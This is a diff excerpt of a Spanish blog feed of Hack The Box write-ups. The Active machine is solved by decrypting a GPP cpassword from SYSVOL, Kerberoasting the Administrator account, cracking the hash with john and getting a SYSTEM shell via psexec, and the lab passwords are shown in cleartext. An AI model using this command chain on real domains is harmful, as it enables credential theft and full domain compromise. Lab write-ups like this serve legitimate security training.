+&lt;p&gt;Dentro de lo observamos, tenemos un recurso interesante en el cual podríamos encontrar credenciales &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Groups.xml&lt;/code&gt; asociado al SYSVOL. SYSVOL es el recurso compartido de todo el dominio en Active Directory al que todos los usuarios autenticados tienen acceso de lectura. SYSVOL contiene scripts de inicio de sesión, datos de políticas de grupo y otros datos de todo el dominio que deben estar disponibles en cualquier lugar donde haya un controlador de dominio (ya que SYSVOL se sincroniza y comparte automáticamente entre todos los controladores de dominio). Para mayor información, podríamos consultar el siguiente recurso: &lt;a href=&quot;https://adsecurity.org/?p=2288&quot;&gt;adsecurity&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Vamos a tratar de visualizar el contenido de dicho archivo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;active.htb/Policies/&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;se&quot;&gt;\}&lt;/span&gt;/MACHINE/Preferences/Groups/Groups.xml
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: active.htb/Policies/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;/MACHINE/Preferences/Groups/Groups.xml
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ &amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;?&amp;gt;
+   2   │ &amp;lt;Groups &lt;span class=&quot;nv&quot;&gt;clsid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;User &lt;span class=&quot;nv&quot;&gt;clsid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;active
+       │ .htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VC_TGS&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;2018-07-18 20:46:06&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;Properties &lt;span class=&quot;nv&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;U
+       │ &quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;newName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;fullName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;cpassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8
+       │ pG5aSVYdYw/NglVmQ&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;changeLogon&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;noChange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;neverExpires&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;acctDisabled&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;active.htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VC_TGS&quot;&lt;/span&gt;/&amp;gt;&amp;lt;/User&amp;gt;
+   3   │ &amp;lt;/Groups&amp;gt;
+───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a filtrar por la información que nos interesa, que es el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cpassword&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userName&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;active.htb/Policies/&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;31B2F340-016D-11D2-945F-00C04FB984F9&lt;span class=&quot;se&quot;&gt;\}&lt;/span&gt;/MACHINE/Preferences/Groups/Groups.xml | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'cpassword=&quot;[^&quot;]\+&quot;\|userName=&quot;[^&quot;]\+&quot;'&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;cpassword&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;active.htb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;VC_TGS&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gpp-decrypt&lt;/code&gt; podemos obtener la contraseña en texto claro, en este caso para el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;active.htb\SVC_TGS&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+GPPstillStandingStrong2k18
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como siempre, guardamos las credenciales que identifiquemos y vamos a validarlas:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SVC_TGS'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'GPPstillStandingStrong2k18'&lt;/span&gt;
+SMB         10.10.10.100    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 6.1 Build 7601 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:DC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:active.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SMB         10.10.10.100    445    DC               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] 
+active.htb&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;VC_TGS:GPPstillStandingStrong2k18
+❯ smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.100 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SVC_TGS'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'GPPstillStandingStrong2k18'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
+        Disk                                                    Permissions     Comment
+        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
+        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
+        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
+        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   NO ACCESS       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Replication                                             READ ONLY
+        SYSVOL                                                  READ ONLY       Logon server share 
+        Users                                                   READ ONLY
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que las credenciales son válidas y ahora tenemos permisos de lectura sobre varios recursos que antes no podíamos del servicio SMB. Ahora podríamos tratar de conectarnos a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt; para obtener información sobre el dominio:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SVC_TGS&quot;&lt;/span&gt; 10.10.10.100
+Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;VC_TGS&lt;span class=&quot;s1&quot;&gt;'s password: 
+rpcclient $&amp;gt; enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[SVC_TGS] rid:[0x44f]
+rpcclient $&amp;gt; enumdomgroups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[DnsUpdateProxy] rid:[0x44e]
+rpcclient $&amp;gt; querygroupmem 0x200
+        rid:[0x1f4] attr:[0x7]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que el único usuario dentro del grupos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Admins&lt;/code&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrator&lt;/code&gt;. Ahora, con la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-GetUserSPNs&lt;/code&gt; podemos solicitar un TGS, en este caso del usuario &lt;strong&gt;Administrator&lt;/strong&gt;. (&lt;strong&gt;Nota&lt;/strong&gt;: En caso de obtener el error &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos SessionError&lt;/code&gt;, nos instalamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdate&lt;/code&gt; para sincronizar nuestro relog con el Domain Controller &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rdate -n 10.10.10.100&lt;/code&gt;)
+.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-GetUserSPNs &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 &lt;span class=&quot;nt&quot;&gt;-request&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-output&lt;/span&gt; tgs.hash
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+&lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
+active/CIFS:445       Administrator  &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Group Policy Creator Owners,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;active,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb  2018-07-18 14:06:40.351723  2021-01-21 10:07:03.723783
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Como ya tenemos un hash dentro del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tgs.hash&lt;/code&gt;, ya debemos estar pensando en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;john&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt tgs.hash
+Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5tgs, Kerberos 5 TGS etype 23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Will run 8 OpenMP threads
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+Ticketmaster1968 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:47 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2021-12-05 22:30&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.02121g/s 223568p/s 223568c/s 223568C/s Tiffani1432..Thehunter22
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos la contraseña del usuario &lt;strong&gt;Administrator&lt;/strong&gt; del dominio y podemos conectarnos a la máquina:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.10.10.100.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file vzDHsSZG.exe
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.10.10.100.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service DVAK on 10.10.10.100.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service DVAK.....
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 6.1.7601]
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2009 Microsoft Corporation.  All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos encontramos dentro de la máquina como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Kerberoasting" /><category term="Active_Directory" /><category term="Powershell" /><summary type="html">Resolución de la máquina Active en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Nineveh</title><link href="http://localhost:4000/htb-nineveh/" rel="alternate" type="text/html" title="Hack The Box Nineveh" /><published>2021-11-28T00:00:00-06:00</published><updated>2021-11-28T00:00:00-06:00</updated><id>http://localhost:4000/htb-nineveh</id><content type="html" xml:base="http://localhost:4000/htb-nineveh/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-nineveh/banner-nineveh.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;nineveh&quot;&gt;Nineveh&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.43.&lt;/p&gt;
@@ -5497,233 +5848,4 @@ C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb
 C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Active_Directory" /><category term="Kerberoasting" /><category term="Powershell" /><category term="AppLocker_Bypass" /><summary type="html">Resolución de la máquina Sizzle en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Blue</title><link href="http://localhost:4000/htb-blue/" rel="alternate" type="text/html" title="Hack The Box Blue" /><published>2021-10-30T00:00:00-05:00</published><updated>2021-10-30T00:00:00-05:00</updated><id>http://localhost:4000/htb-blue</id><content type="html" xml:base="http://localhost:4000/htb-blue/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-blue/banner-blue.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;blue&quot;&gt;Blue&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.40.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.40
-PING 10.10.10.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.40&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.40: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;144 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.40 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 144.246/144.246/144.246/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-09-16 21:40 CDT
-Initiating SYN Stealth Scan at 21:40
-Scanning 10.10.10.40 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 135/tcp on 10.10.10.40
-Discovered open port 445/tcp on 10.10.10.40
-Discovered open port 139/tcp on 10.10.10.40
-Discovered open port 49152/tcp on 10.10.10.40
-Discovered open port 49153/tcp on 10.10.10.40
-Discovered open port 49157/tcp on 10.10.10.40
-Discovered open port 49155/tcp on 10.10.10.40
-Discovered open port 49156/tcp on 10.10.10.40
-Discovered open port 49154/tcp on 10.10.10.40
-Completed SYN Stealth Scan at 21:41, 30.60s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.40
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.21s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2021-09-16 21:40:49 CDT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;30s
-Not shown: 63970 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1556 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT      STATE SERVICE      REASON
-135/tcp   open  msrpc        syn-ack ttl 127
-139/tcp   open  netbios-ssn  syn-ack ttl 127
-445/tcp   open  microsoft-ds syn-ack ttl 127
-49152/tcp open  unknown      syn-ack ttl 127
-49153/tcp open  unknown      syn-ack ttl 127
-49154/tcp open  unknown      syn-ack ttl 127
-49155/tcp open  unknown      syn-ack ttl 127
-49156/tcp open  unknown      syn-ack ttl 127
-49157/tcp open  unknown      syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;30.98 seconds
